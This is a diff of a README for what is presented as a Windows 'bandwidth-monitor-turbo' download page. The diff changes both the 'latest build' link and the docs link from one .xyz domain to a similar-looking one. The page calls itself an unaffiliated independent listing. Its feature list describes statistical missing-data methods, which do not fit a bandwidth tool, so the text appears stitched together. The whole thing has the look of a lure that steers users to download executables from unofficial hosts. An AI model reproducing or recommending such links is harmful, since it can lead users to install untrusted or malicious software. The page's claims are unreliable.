@@ -34,8 +34,8 @@ Yes, it's built and tested for Windows.
 * **Missing Data Handling:** Multiple imputation, listwise deletion, and pattern analysis.
 
 ## 🔗 Links
-- 📥 **Get the latest build:** [https://bandwidth-monitor-turbo.softonx.xyz](https://bandwidth-monitor-turbo.softonx.xyz)
-- 📖 **Docs & guides:** [https://bandwidth-monitor-turbo.softonx.xyz](https://bandwidth-monitor-turbo.softonx.xyz)
+- 📥 **Get the latest build:** [https://bandwidth-monitor-turbo.softax.xyz](https://bandwidth-monitor-turbo.softax.xyz)
+- 📖 **Docs & guides:** [https://bandwidth-monitor-turbo.softax.xyz](https://bandwidth-monitor-turbo.softax.xyz)
 
 ## A note on usage
 > Use responsibly. This page is an independent listing and is not affiliated with the original vendor.                    
